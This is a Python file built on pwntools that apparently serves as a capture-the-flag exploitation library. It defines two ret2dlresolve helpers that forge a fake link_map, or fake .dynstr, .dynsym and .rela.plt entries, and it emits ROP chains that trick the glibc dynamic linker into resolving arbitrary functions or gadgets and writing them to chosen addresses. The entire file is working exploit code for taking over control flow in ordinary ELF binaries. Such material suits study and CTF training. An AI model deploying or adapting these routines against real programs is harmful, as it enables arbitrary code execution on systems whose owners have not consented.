#!/usr/bin/env python3

from pwn import *

def ret2dlresolve_linkmap(elf, libc_elf, fake_linkmap_addr, got_func, target_func, write_back=True, write_addr=0) -> tuple[bytes, bytes]:
    r"""
    Ret2dlresolve with constructing fake linkmap.

    Arguments:
        elf(ELF): The ELF object of the binary
        libc_elf(ELF): The ELF object of the libc
        fake_linkmap_addr(int): Address where the fake link map will be placed
        got_func(str): Name of the function to be used/replaced
        target_func(str/list): Name of the target function or the list of target gadgets to be resolved
        write_back(bool): Whether to write back to the GOT entry
        write_addr(int): Other address to write the resolved address if write_back is False, 0 for ignored

    Returns:
        tuple[bytes,bytes]:

        dlresolve_rop(bytes): The ROP chain to invoke the dynamic linker resolver(0x18)

        fake_linkmap(bytes): The constructed fake linkmap as bytes(0x100)

    Example:
        >>> plt0 = elf.get_section_by_name(".plt").header.sh_addr
        >>> dlresolve_rop, fake_linkmap = ret2dlresolve_linkmap(elf, libc_elf, linkmap_addr, 'read', 'puts')
        >>> payload = dlresolve_rop + other_gadgets + fake_linkmap
        >>> ...
        >>> dlresolve_rop, fake_linkmap = ret2dlresolve_linkmap(elf, libc_elf, linkmap_addr, 'read', ["pop rdi", "ret"], write_back=False)
    """
    # get the address in got_addr, add the offset, jump to the result address, and write it back to got_addr if write_back is True
    # Actually, the got_addr can be any addr contains the libc address
    # Change the got_addr to get any address you want
    # Change the write_back_addr to to write the resolved address to anywhere you want
    got_addr = elf.got[got_func]
    got_func_offset = libc_elf.symbols[got_func]
    target_func_offset = target_func if isinstance(target_func, int) else (libc_elf.symbols[target_func] if isinstance(target_func, str) else ROP(libc_elf).find_gadget(target_func).address)

    DT_STRTAB = 5
    DT_SYMTAB = 6
    DT_JMPREL = 23

    # construct fake linkmap
    l_addr = target_func_offset - got_func_offset
    l_addr &= 0xFFFFFFFFFFFFFFFF
    fake_linkmap = p64(l_addr) # l_addr, both the resolved address and the write back address will add this offset
    fake_linkmap += p64(0)  # l_name

    # construct fake .dynamic entries 
    fake_linkmap += p64(DT_STRTAB) + p64(0) # (l_ld、l_next) -> fake .dynamic DT_STRTAB, .dynstr can be NULL
    fake_linkmap += p64(DT_SYMTAB) + p64(got_addr - 0x8) # (l_prev、l_add) -> fake .dynamic DT_SYMTAB
    fake_linkmap += p64(DT_JMPREL) + p64(fake_linkmap_addr + 0x40)  # (l_refcnt、l_scope) -> fake .dynamic DT_JMPREL
    
    # construct fake .rela.plt
    write_back_addr = got_addr if write_back else write_addr if write_addr != 0 else (fake_linkmap_addr + 0x8)
    write_back_addr -= l_addr
    write_back_addr &= 0xFFFFFFFFFFFFFFFF
    fake_rela_plt = p64(write_back_addr) + p32(0x7) + p32(0) + p64(0)
    fake_linkmap += fake_rela_plt  # l_info[0, 3] -> fake .rela.plt entry

    # l_info padding
    fake_linkmap += p64(0) * (DT_STRTAB - 3)  # l_info[3, DT_STRTAB]
    fake_linkmap += p64(fake_linkmap_addr + 0x10) # l_info[DT_STRTAB]
    fake_linkmap += p64(0) * (DT_SYMTAB - DT_STRTAB - 1)  # l_info[DT_STRTAB+1, DT_SYMTAB]
    fake_linkmap += p64(fake_linkmap_addr + 0x20) # l_info[DT_SYMTAB]
    fake_linkmap += p64(0) * (DT_JMPREL - DT_SYMTAB - 1)  # l_info[DT_SYMTAB+1, DT_JMPREL]
    fake_linkmap += p64(fake_linkmap_addr + 0x30) # l_info[DT_JMPREL]

    # the rop chain
    plt0 = elf.get_section_by_name(".plt").header.sh_addr
    dlresolve_rop = p64(plt0 + 6) + p64(fake_linkmap_addr) + p64(0)
    
    return dlresolve_rop, fake_linkmap

def ret2dlresolve(elf, fake_data_addr, got_func, target_func) -> tuple[bytes, bytes]:
    r"""
    Ret2dlresolve without constructing fake linkmap.

    Arguments:
        elf(ELF): The ELF object of the binary
        fake_data_addr(int): Address where the fake data will be placed
        got_func(str): Name of the function to be replaced
        target_func(str): Name of the target function to be resolved

    Returns:
        tuple[bytes,bytes]:

        dlresolve_rop(bytes): The ROP chain to invoke the dynamic linker resolver(0x18)

        fake_data(bytes): The constructed fake data as bytes(0x50)

    Example:
        >>> plt0 = elf.get_section_by_name(".plt").header.sh_addr
        >>> dlresolve_rop, fake_data = ret2dlresolve(elf, fake_data_addr, 'setvbuf', 'puts')
        >>> payload = dlresolve_rop + other_gadgets + fake_data
    """
    # construct fake .dynstr entry
    dyn_str = elf.get_section_by_name(".dynstr").header.sh_addr
    fake_dyn_str_entry_addr = fake_data_addr
    fake_dyn_str_entry_offset = fake_dyn_str_entry_addr - dyn_str
    fake_dyn_str_entry = target_func.encode() + b'\0'

    # construct fake .dynsym entry, need to align to 0x18 from .dynsym
    dyn_sym = elf.get_section_by_name(".dynsym").header.sh_addr
    fake_dyn_sym_entry_index = (fake_dyn_str_entry_addr + len(fake_dyn_str_entry) - dyn_sym + 23) // 24 
    fake_dyn_sym_entry_addr = dyn_sym + fake_dyn_sym_entry_index * 24
    padding1 = b"A" * (fake_dyn_sym_entry_addr - (fake_dyn_str_entry_addr + len(fake_dyn_str_entry)))
    fake_dyn_sym_entry = p32(fake_dyn_str_entry_offset) + p32(0) + p64(0) + p64(0)

    # construct fake .rela.plt entry, need to align to 0x18 from .rela.plt
    rela_plt = elf.get_section_by_name(".rela.plt").header.sh_addr
    fake_rela_plt_entry_index = (fake_dyn_sym_entry_addr + len(fake_dyn_sym_entry) - rela_plt + 23) // 24
    fake_rela_plt_entry_addr = rela_plt + fake_rela_plt_entry_index * 24
    padding2 = b"A" * (fake_rela_plt_entry_addr - (fake_dyn_sym_entry_addr + len(fake_dyn_sym_entry)))
    fake_rela_plt_entry = p64(elf.got[got_func]) + p32(0x7) + p32(fake_dyn_sym_entry_index) + p64(0)

    fake_data = fake_dyn_str_entry + padding1 + fake_dyn_sym_entry + padding2 + fake_rela_plt_entry

    # the rop chain
    plt0 = elf.get_section_by_name(".plt").header.sh_addr
    dlresolve_rop = p64(plt0) + p64(fake_rela_plt_entry_index)

    return dlresolve_rop, fake_data